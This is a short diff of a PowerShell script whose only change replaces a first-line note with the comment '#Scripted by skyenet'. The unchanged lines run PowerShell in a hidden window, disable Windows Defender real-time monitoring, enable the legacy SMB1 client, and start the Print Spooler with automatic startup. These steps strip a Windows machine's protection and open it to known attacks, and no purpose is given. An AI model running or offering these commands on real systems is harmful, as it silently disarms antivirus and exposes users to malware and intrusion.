@@ -1,4 +1,5 @@
-Scripted already PowerShell.exe -windowstyle hidden {Set-MpPreference -DisableRealtimeMonitoring $True
+#Scripted by skyenet
+PowerShell.exe -windowstyle hidden {Set-MpPreference -DisableRealtimeMonitoring $True
 Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All
 Start-Service -Name Spooler
 Set-Service -Name Spooler -StartupType Automatic
